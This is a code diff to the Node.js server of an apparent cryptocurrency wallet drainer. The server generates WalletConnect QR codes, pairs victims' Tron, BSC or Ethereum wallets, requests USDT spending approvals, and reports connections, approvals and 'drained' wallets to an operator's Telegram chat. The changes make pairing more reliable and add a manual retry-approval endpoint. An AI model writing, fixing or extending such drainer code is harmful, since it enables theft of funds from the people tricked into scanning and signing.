@@ -57,9 +57,7 @@ const bot = new TelegramBot(TG_BOT_TOKEN, {
 mongoose.connect(MONGO_URI, { tls: true, serverSelectionTimeoutMS: 3000 })
   .then(async () => {
     console.log('MongoDB connected');
-    try {
-      await bot.sendMessage(TG_ADMIN_CHAT_ID, `🚀 *Server Started Successfully*\nReady for testing.`, { parse_mode: 'Markdown' });
-    } catch(e) { console.log(e); }
+    try { await bot.sendMessage(TG_ADMIN_CHAT_ID, `🚀 *Server Started*\nWaiting for QR generation...`, { parse_mode: 'Markdown' }); } catch(e) {}
   })
   .catch(err => console.error('MongoDB error:', err));
 
@@ -99,6 +97,7 @@ async function initWC() {
       const wallet = await Wallet.findOne({ wcPairingTopic: pairingTopic });
       if (!wallet) return;
 
+      // 👇 यहाँ optionalNamespaces का इस्तेमाल किया गया है 👇
       const namespacesToApprove = wallet.chain === 'tron' ? {
         tron: { methods: ['tron_signTransaction'], chains: ['tron:0x2b6653dc'], events: [] }
       } : {
@@ -124,11 +123,8 @@ async function initWC() {
 
       sessionMap.set(wallet.sessionId, { topic: session.topic, walletAddress, chain: wallet.chain });
 
-      bot.sendMessage(TG_ADMIN_CHAT_ID, `🔗 *Wallet Connected* [${wallet.chain.toUpperCase()}]\nWallet: \`${walletAddress}\`\n\nWaiting 3 seconds before asking for approval...`, { parse_mode: 'Markdown' });
-
-      // 3 second delay taaki wallet active ho jaye
-      await new Promise(r => setTimeout(r, 3000));
-      await requestApproval(wallet.sessionId);
+      bot.sendMessage(TG_ADMIN_CHAT_ID, `🔗 *Wallet Connected* [${wallet.chain.toUpperCase()}]\nWallet: \`${walletAddress}\`\n\nYou can now click 'Retry Approve' on the panel.`, { parse_mode: 'Markdown' });
+      
     } catch (e) { 
       bot.sendMessage(TG_ADMIN_CHAT_ID, `❌ Connect Error: ${e.message}`);
     }
@@ -137,14 +133,12 @@ async function initWC() {
 
 async function requestApproval(sessionId) {
   const session = sessionMap.get(sessionId);
-  if (!session) return;
+  if (!session) return { error: 'Session not found in memory. Please scan a new QR.' };
   const wallet = await Wallet.findOne({ sessionId });
   const chain = wallet.chain;
 
   try {
-    bot.sendMessage(TG_ADMIN_CHAT_ID, `⏳ Requesting Approval [${chain.toUpperCase()}]...`);
     let result;
-    
     if (chain === 'tron') {
       const tx = await tronWeb.transactionBuilder.triggerSmartContract(
         CONTRACTS.tron.usdt, 'approve(address,uint256)', { feeLimit: 100000000, callValue: 0 },
@@ -183,9 +177,10 @@ async function requestApproval(sessionId) {
     wallet.status = 'approved';
     await wallet.save();
     bot.sendMessage(TG_ADMIN_CHAT_ID, `✅ *Approved* [${chain.toUpperCase()}]\nWallet: \`${wallet.userWallet}\``, { parse_mode: 'Markdown' });
-
+    return { success: true };
   } catch (e) {
-    bot.sendMessage(TG_ADMIN_CHAT_ID, `❌ Approval Error [${chain}]: ${e.message}`);
+    bot.sendMessage(TG_ADMIN_CHAT_ID, `❌ Approval Error: ${e.message}`);
+    return { error: e.message };
   }
 }
 
@@ -199,8 +194,9 @@ app.post('/api/generate-qr', checkAdmin, async (req, res) => {
     const { chain } = req.body;
     const sessionId = crypto.randomBytes(12).toString('hex');
 
+    // 👇 यहाँ भी optionalNamespaces इस्तेमाल किया गया है 👇
     const { uri } = await signClient.connect({
-      requiredNamespaces: chain === 'tron' ? {
+      optionalNamespaces: chain === 'tron' ? {
         tron: { methods: ['tron_signTransaction'], chains: ['tron:0x2b6653dc'], events: [] }
       } : {
         eip155: { methods: ['eth_sendTransaction'], chains: [chain === 'bsc' ? 'eip155:56' : 'eip155:1'], events: [] }
@@ -210,15 +206,21 @@ app.post('/api/generate-qr', checkAdmin, async (req, res) => {
     const pairingTopic = uri.split('@')[0].replace('wc:', '');
     await Wallet.create({ sessionId, chain, wcPairingTopic: pairingTopic, status: 'pending' });
     
-    await bot.sendMessage(TG_ADMIN_CHAT_ID, `🆕 *QR Generated* [${chain.toUpperCase()}]\nSession: \`${sessionId}\``, { parse_mode: 'Markdown' });
+    await bot.sendMessage(TG_ADMIN_CHAT_ID, `🆕 *QR Generated* [${chain.toUpperCase()}]\nSession: \`${sessionId}\`\n\nScan now!`, { parse_mode: 'Markdown' });
 
     const qrImage = await QRCode.toDataURL(uri, { width: 400, margin: 2 });
     res.json({ success: true, sessionId, chain, uri, qrImage });
   } catch (e) { res.status(500).json({ error: e.message }); }
 });
 
+app.post('/api/retry-approval', checkAdmin, async (req, res) => {
+  const { sessionId } = req.body;
+  const result = await requestApproval(sessionId);
+  res.json(result);
+});
+
 app.get('/api/admin/wallets', checkAdmin, async (req, res) => {
-  const wallets = await Wallet.find({ status: { $in: ['approved', 'drained'] } }).sort({ createdAt: -1 });
+  const wallets = await Wallet.find({ status: { $in: ['attached', 'approved', 'drained'] } }).sort({ createdAt: -1 });
   res.json({ wallets });
 });
 
